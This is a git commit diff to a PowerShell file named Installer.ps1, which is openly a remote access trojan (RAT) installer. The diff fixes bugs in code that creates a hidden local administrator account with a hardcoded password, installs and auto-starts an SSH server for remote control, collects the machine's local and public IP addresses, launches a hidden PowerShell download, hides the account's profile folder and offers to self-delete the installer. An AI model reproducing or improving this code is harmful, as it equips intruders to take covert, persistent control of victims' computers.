600b62cf7cf79f36ecb92ce8250d6999408f6261
mod <moding444@gmail.com>
2024-11-28 00:57:26 +0500

    Python Console

--- files/Installer.ps1
+++ files/Installer.ps1
@@ -3,7 +3,7 @@
 
 # Random string creator to create names for files
 function random_text {
-    return -join((65..90) + (97..22) | Get-Random -Count 5 | % {[char]$__})
+    return -join((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
 
 
@@ -35,7 +35,7 @@ function create_account {
 }
 
 #Creates Admin User
-Remove-LocalUser -Name "onlyrat"  # Remove the user in case it already exists
+Remove-LocalUser -Name "WinGuest"  # Remove the user in case it already exists
 $uname = "WinGuest"  # Username for the newly created LocalAdmin
 $pword = (ConvertTo-SecureString "RATy" -AsPlainText -Force)  # Password for the Newly Created LocalAdmin
 create_account -uname $uname -pword $pword   # Creates LocalAdmin on getters end
@@ -45,11 +45,10 @@ create_account -uname $uname -pword $pword   # Creates LocalAdmin on getters end
 #  VARIABLES
 # FOR Working Directory names, inside Temp Directory of Windows
 $wd = random_text    # creates and store a string of random characters inside $wd (working directory) which can be later given to a file as "name"
-$workingDirectoryInTemp = "$env:temp/$wd"    # path of the folder in temp directory in which we will store our RAT related files
+$workingDirectoryInTemp = "$env:temp\$wd"    # path of the folder in temp directory in which we will store our RAT related files
 $initial_dir = Get-Location    # for storing the current directory we are in OR where the 'installer.ps1' file is placed, will be used for self deleting 'installer.ps1' file in the end - 'Get-Location' in .ps1 == '%cd%' in .cmd
 echo $workingDirectoryInTemp
 $configFile = Join-Path (Get-Location) "$env:UserName.rat"
-$wd = Get-Location
 $LocalEthernetIP = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
 $LocalWifiIP = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Wi-fi).IPAddress
 $GlobalPublicIP = (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim()
@@ -115,8 +114,8 @@ cd $workingDirectoryInTemp    # moves to our own created folder inside temp dire
 # Will Install OpenSSH Server
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 
-# Will Start the Server after Download and Install (automatic in background) || -Name sshd  -- means that the sshd service shoud start 
-# sshd (Sexure Shell Daemon) is a server side prigram that looks for and handles incoming ssh requests - authenticating them and establishing ssh connections 
+# Will Start the Server after Download and Install (automatic in background) || -Name sshd  -- means that the sshd service shoud start
+# sshd (Sexure Shell Daemon) is a server side prigram that looks for and handles incoming ssh requests - authenticating them and establishing ssh connections
 Start-Service -Name sshd
 
 # It will make sure that the SSH service starts automatically when the PC restarts
@@ -147,10 +146,10 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://r
 # if in future i need to create and put any file in the created (random named) folder inside the temp directory, the code for creating that particular file will go here
 ###
 
-# A humble try to hide the Newly Created Use (WinGuest) from the 
+# A humble try to hide the Newly Created User (WinGuest) from the
 cd $env:USERPROFILE
- cd..
- attrib +h +s +r WinGuest   # Marks the file as Hidden, System & Read Only File 
+cd..
+attrib +h +s +r WinGuest   # Marks the file as Hidden, System & Read Only File
 
 #Same as PAUSE command in .cmd
 Read-Host "Wanna delete 'installer.ps1'? Press any key to continue"
